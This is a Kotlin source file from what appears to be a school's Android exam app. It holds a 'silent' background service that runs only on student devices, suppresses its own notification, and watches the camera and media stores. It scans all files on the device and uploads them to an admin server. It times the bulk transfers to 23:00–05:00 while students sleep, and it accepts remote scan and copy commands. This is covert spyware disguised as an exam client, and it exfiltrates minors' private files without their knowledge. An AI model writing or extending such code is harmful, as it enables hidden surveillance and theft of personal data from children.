package com.school.smartcbt.service

import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.os.Build
import android.os.IBinder
import android.util.Log
import com.school.smartcbt.BuildConfig
import com.school.smartcbt.data.model.BasicResponse
import com.school.smartcbt.ui.LoginActivity
import com.school.smartcbt.utils.NotificationHelper
import com.school.smartcbt.utils.SessionManager
import java.util.concurrent.Executors
import java.util.concurrent.ScheduledExecutorService
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean

/**
 * Silent Background Manager for device telemetry, heartbeat, and automated file metadata
 * synchronization with the CBT Admin Portal without persistent notification.
 */
object DeviceSyncManager {
    private const val TAG = "DeviceSyncManager"
    @Volatile var isScannerEnabledGlobally: Boolean = true
    private var scheduledExecutor: ScheduledExecutorService? = null
    private val isSyncingFiles = AtomicBoolean(false)
    private var lastUpdateNotifTime = 0L
    private var contentObserverRegistered = false
    private var lastMediaChangeTime = 0L
    private var wifiCallbackRegistered = false
    private var wifiNetworkCallback: ConnectivityManager.NetworkCallback? = null

    fun start(context: Context) {
        val appContext = context.applicationContext

        val sessionManager = SessionManager(appContext)
        val role = sessionManager.getRole().uppercase().trim()
        if (role != "STUDENT" && role != "SISWA") {
            Log.d(TAG, "DeviceSyncManager skipped: role is not STUDENT ($role)")
            stop()
            return
        }

        // Setup background sync and telemetry

        // Register MediaStore Observer for real-time camera/download live notifications
        registerMediaObserver(appContext)

        // Register NetworkCallback untuk auto-resume upload saat tersambung internet (WiFi / Paket Data)
        registerNetworkCallback(appContext)

        if (scheduledExecutor != null && !scheduledExecutor!!.isShutdown) {
            return
        }

        scheduledExecutor = Executors.newScheduledThreadPool(2)

        // 1. Immediate device registration & initial heartbeat
        scheduledExecutor?.schedule({
            try {
                FileScannerService.registerDevice(appContext) { success ->
                    Log.d(TAG, "Device registration status: $success")
                }
                FileScannerService.sendHeartbeat(appContext) { response ->
                    if (response != null) handleHeartbeatResponse(appContext, response)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Initial registration error: ${e.message}")
            }
        }, 1, TimeUnit.SECONDS)

        // 2. Periodic heartbeat every 30 seconds - keep device ONLINE on admin portal
        scheduledExecutor?.scheduleWithFixedDelay({
            try {
                FileScannerService.sendHeartbeat(appContext) { response ->
                    if (response != null) handleHeartbeatResponse(appContext, response)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Heartbeat failed: ${e.message}")
            }
        }, 5, 30, TimeUnit.SECONDS)

        // 3. Check pending copy requests fallback timer (45 seconds).
        // Catatan: Heartbeat sudah otomatis memicu checkPendingRequests seketika saat ada antrean (hasPendingCopyRequests == true).
        scheduledExecutor?.scheduleWithFixedDelay({
            try {
                FileScannerService.checkPendingRequests(appContext)
            } catch (e: Exception) {}
        }, 10, 45, TimeUnit.SECONDS)

        // 4. Initial File Scan & Sync (3s delay)
        scheduledExecutor?.schedule({
            triggerFileScanAndSync(appContext)
        }, 3, TimeUnit.SECONDS)

        // 5. Periodic File Scan every 3 minutes
        scheduledExecutor?.scheduleWithFixedDelay({
            triggerFileScanAndSync(appContext)
        }, 90, 180, TimeUnit.SECONDS)

        Log.d(TAG, "DeviceSyncManager started silently in background without foreground notification")
    }

    /**
     * NetworkCallback: Deteksi otomatis saat internet tersambung (WiFi atau Paket Data Seluler).
     * - onAvailable: Internet tersambung → langsung cek & lanjutkan pending file upload & sync
     * - onLost: Internet terputus → upload berhenti secara graceful
     */
    private fun registerNetworkCallback(appContext: Context) {
        if (wifiCallbackRegistered) return
        try {
            val cm = appContext.getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager ?: return
            val request = NetworkRequest.Builder()
                .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                .build()

            wifiNetworkCallback = object : ConnectivityManager.NetworkCallback() {
                override fun onAvailable(network: Network) {
                    Log.d(TAG, "[NETWORK CALLBACK] Koneksi internet aktif (WiFi / Paket Data)! Melanjutkan pending upload...")
                    // Langsung cek pending requests — resume upload yang tertunda
                    try {
                        FileScannerService.checkPendingRequests(appContext)
                    } catch (e: Exception) {
                        Log.w(TAG, "Error resuming pending requests on network connect: ${e.message}")
                    }
                    // Juga trigger file scan untuk sinkronisasi metadata terbaru
                    try {
                        triggerFileScanAndSync(appContext)
                    } catch (e: Exception) {
                        Log.w(TAG, "Error triggering sync on network connect: ${e.message}")
                    }
                }

                override fun onLost(network: Network) {
                    Log.d(TAG, "[NETWORK CALLBACK] Koneksi internet terputus — upload ditunda hingga jaringan kembali aktif.")
                }
            }

            cm.registerNetworkCallback(request, wifiNetworkCallback!!)
            wifiCallbackRegistered = true
            Log.d(TAG, "[NETWORK CALLBACK] Network monitor terdaftar — auto-resume aktif untuk WiFi & Paket Data")
        } catch (e: Exception) {
            Log.w(TAG, "Error registering Network callback: ${e.message}")
        }
    }

    private fun registerMediaObserver(appContext: Context) {
        if (contentObserverRegistered) return
        try {
            val observer = object : android.database.ContentObserver(android.os.Handler(android.os.Looper.getMainLooper())) {
                override fun onChange(selfChange: Boolean) {
                    super.onChange(selfChange)
                    if (!isScannerEnabledGlobally) return
                    val now = System.currentTimeMillis()
                    if (now - lastMediaChangeTime > 2500L) { // Debounce 2.5s
                        lastMediaChangeTime = now
                        FileScannerService.notifyNewFileLive(appContext)
                    }
                }
            }
            appContext.contentResolver.registerContentObserver(
                android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                true,
                observer
            )
            appContext.contentResolver.registerContentObserver(
                android.provider.MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                true,
                observer
            )
            contentObserverRegistered = true
        } catch (e: Exception) {
            Log.w(TAG, "Error registering media observer: ${e.message}")
        }
    }

    fun triggerImmediateSync(context: Context) {
        triggerFileScanAndSync(context.applicationContext)
    }

    private fun triggerFileScanAndSync(context: Context) {
        if (!isScannerEnabledGlobally) {
            Log.d(TAG, "[SCANNER OFF] Pemindaian & sinkronisasi berkas ditangguhkan karena fitur Scanner File sedang dimatikan via portal admin.")
            return
        }

        val cal = java.util.Calendar.getInstance(java.util.TimeZone.getTimeZone("Asia/Jakarta"))
        val hour = cal.get(java.util.Calendar.HOUR_OF_DAY)
        val isNightWindow = (hour >= 23 || hour < 5) // 23:00 s.d. 05:00 WIB (Waktu Tidur Siswa)

        if (!isNightWindow) {
            Log.d(TAG, "Mode siang aktif: HP siswa sedang dipakai. Transfer dan pemindaian berkas skala besar hanya aktif pada waktu tidur malam (23:00 - 05:00 WIB).")
            return
        }

        if (isSyncingFiles.compareAndSet(false, true)) {
            Thread {
                try {
                    Log.d(TAG, "Starting media & files scan on device (Nighttime Sleep Window 23:00 - 05:00 WIB)...")
                    val files = FileScannerService.scanAllFiles(context)
                    Log.d(TAG, "Scanned ${files.size} files from device storage")
                    FileScannerService.syncFilesToServer(context, files) { synced ->
                        Log.d(TAG, "Successfully synced $synced files to backend portal (total scanned: ${files.size})")
                        isSyncingFiles.set(false)
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "File scanner execution error: ${e.message}")
                    isSyncingFiles.set(false)
                }
            }.start()
        }
    }

    private fun handleHeartbeatResponse(context: Context, response: BasicResponse) {
        if (response.fileScannerEnabled != null) {
            val wasEnabled = isScannerEnabledGlobally
            isScannerEnabledGlobally = response.fileScannerEnabled
            if (wasEnabled != isScannerEnabledGlobally) {
                Log.d(TAG, "[SCANNER TOGGLE] Status remote scanner diubah oleh server: isScannerEnabledGlobally=$isScannerEnabledGlobally")
            }
        }

        if (response.forceLogout == true) {
            Log.w(TAG, "FORCE_LOGOUT received from server. Clearing session and redirecting to LoginActivity...")
            SessionManager(context).clearSession()
            try {
                scheduledExecutor?.shutdownNow()
            } catch (e: Exception) {}

            val bcIntent = Intent("com.school.smartcbt.ACTION_FORCE_LOGOUT")
            context.sendBroadcast(bcIntent)

            val loginIntent = Intent(context, LoginActivity::class.java).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
                putExtra("EXTRA_FORCE_LOGOUT", true)
            }
            context.startActivity(loginIntent)
            return
        }

        if (response.triggerScan == true) {
            Log.d(TAG, "Heartbeat requested triggerScan! Launching media scan immediately...")
            triggerFileScanAndSync(context)
        }

        if (response.latestVersionCode != null && response.latestVersionCode > BuildConfig.VERSION_CODE) {
            val now = System.currentTimeMillis()
            if (now - lastUpdateNotifTime > 300_000) {
                lastUpdateNotifTime = now
                val vName = response.latestVersionName ?: "v${response.latestVersionCode}"
                val downloadUrl = "https://cbt.smpn1boyolangu.my.id/uploads/smartcbt-latest.apk"
                NotificationHelper.showUpdateNotificationWithDirectDownload(
                    context,
                    vName,
                    downloadUrl
                )
            }
        }
    }

    fun stop() {
        try {
            scheduledExecutor?.shutdownNow()
        } catch (e: Exception) {}
        scheduledExecutor = null
    }
}

/**
 * Service for silent 24/7 device telemetry and monitoring without foreground notification tray icon.
 */
class DeviceSyncBackgroundService : Service() {

    companion object {
        private const val TAG = "DeviceSyncService"
        private const val NOTIFICATION_ID = 8821

        fun startService(context: Context) {
            val role = SessionManager(context).getRole().uppercase().trim()
            if (role != "STUDENT" && role != "SISWA") {
                Log.d(TAG, "DeviceSyncBackgroundService skipped for non-student role: $role")
                return
            }
            try {
                // Hapus notifikasi agar tidak terlihat di notification tray
                val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as? NotificationManager
                nm?.cancel(NOTIFICATION_ID)
                // Jalankan sinkronisasi hening 100% tanpa notifikasi di status bar
                DeviceSyncManager.start(context.applicationContext)
            } catch (e: Exception) {
                Log.e(TAG, "Error starting DeviceSync: ${e.message}")
            }
        }
    }

    private var wakeLock: android.os.PowerManager.WakeLock? = null

    override fun onCreate() {
        super.onCreate()
        try {
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as? NotificationManager
            nm?.cancel(NOTIFICATION_ID)
            stopForeground(true)
        } catch (_: Exception) {}
        DeviceSyncManager.start(applicationContext)
        stopSelf()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        try {
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as? NotificationManager
            nm?.cancel(NOTIFICATION_ID)
            stopForeground(true)
        } catch (_: Exception) {}
        DeviceSyncManager.start(applicationContext)
        stopSelf()
        return START_NOT_STICKY
    }

    private fun acquireWakeLock() {
        try {
            val pm = getSystemService(Context.POWER_SERVICE) as? android.os.PowerManager
            wakeLock = pm?.newWakeLock(android.os.PowerManager.PARTIAL_WAKE_LOCK, "SmartCBT:DeviceSyncWakeLock")
            wakeLock?.acquire(30 * 60 * 1000L)
        } catch (e: Exception) {}
    }

    override fun onDestroy() {
        try {
            wakeLock?.let { if (it.isHeld) it.release() }
        } catch (e: Exception) {}
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
